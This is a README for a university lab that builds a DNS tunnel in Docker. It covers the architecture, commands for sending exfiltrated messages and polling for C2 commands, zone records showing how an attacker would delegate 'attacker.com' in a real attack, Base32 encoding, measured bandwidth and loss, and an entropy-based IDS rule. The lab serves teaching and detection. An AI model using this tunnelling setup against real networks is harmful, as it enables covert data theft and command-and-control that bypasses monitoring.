# DNS Tunnel Lab – Foundations of Cybersecurity

## Architecture

```
[Client 10.10.0.100]
   │  DNS queries: <b32_chunk>.<seq>.<session>.tunnel.lab
   │
   ▼
[Unbound resolver 10.10.0.2]          ← stub-zone delegation
   │  (mirrors a real NS delegation for attacker.com)
   │
   ▼
[Authoritative server 10.10.0.10]     ← attacker-controlled
   │  Reconstructs payload from chunks
   │  Returns commands via TXT records
   ▼
  [logs/server_events.jsonl]
```

## Quick start

```bash
# Requires: Docker + Docker Compose

chmod +x run_experiment.sh
./run_experiment.sh
```

Or step by step:

```bash
docker compose up -d --build

# Exfiltrate a custom message
docker exec -it dns_client python client.py --send "top secret data"

# Run all measurements
docker exec -it dns_client python client.py --measure

# Detectability analysis only (no network needed)
docker exec -it dns_client python metrics.py

# Check what the server received
docker exec dns_authoritative cat /logs/server_events.jsonl

# Queue a C2 command (from server side – needs exec)
# The client will receive it on next cmd.s1.tunnel.lab poll
docker exec dns_authoritative python - <<'EOF'
from server import TunnelResolver  # won't work directly; see note below
EOF
```

## Realistic DNS configuration (Slide 9 note)

In the lab: Unbound has a `stub-zone` for `tunnel.lab` pointing to 10.10.0.10.  
In a real attack: attacker registers `attacker.com`, adds:
```
attacker.com.   NS   ns1.attacker.com.
ns1.attacker.com.  A   <VPS public IP>
```
Every corporate resolver then naturally forwards `*.attacker.com` queries
to the attacker's VPS. The lab mirrors this logic exactly.

## Encoding scheme (Slide 7 connection)

```
Payload (bytes)  →  Base32  →  30-char chunks  →  DNS labels
"secret"         →  "ON2XEZI=" →  ["on2xezi"]  →  on2xezi.0.s1.tunnel.lab
```

Base32 uses only `[a-z2-7]`, which is a valid DNS label charset.
Max label length: 63 chars → 63 chars × 5 bits/char = ~315 bits ≈ 39 bytes/query.

## Expected measurements for slides 10–11

### Bandwidth
| Payload | Expected avg |
|---------|-------------|
| 64 B    | ~15–25 B/s  |
| 256 B   | ~20–30 B/s  |
| 1024 B  | ~20–30 B/s  |

Bottleneck: `INTER_QUERY = 0.05 s` × chunk size → ~600 B/s theoretical max.
Actual: lower due to RTT and resolver overhead.
Note: legitimate DNS traffic has >1000× higher bandwidth → channel is very slow.

### Robustness
| Packet loss | Expected delivery rate |
|-------------|----------------------|
| 0%          | ~100%                |
| 5%          | ~95%                 |
| 10%         | ~90%                 |
| 20%         | ~80%                 |

No retransmission in this implementation → delivery rate ≈ 1 − loss_rate.
Real tools (iodine, dnscat2) add retransmission → better robustness at cost of bandwidth.

### Detectability
| Feature                    | Normal DNS | Tunnel DNS |
|----------------------------|-----------|-----------|
| Label entropy (bits/char)  | ~2.5      | ~4.7      |
| Avg label length (chars)   | ~5        | ~30       |
| Same domain queries/min    | <10       | >200      |

A simple IDS rule: `entropy(label) > 3.5 OR len(label) > 20` → suspicious.
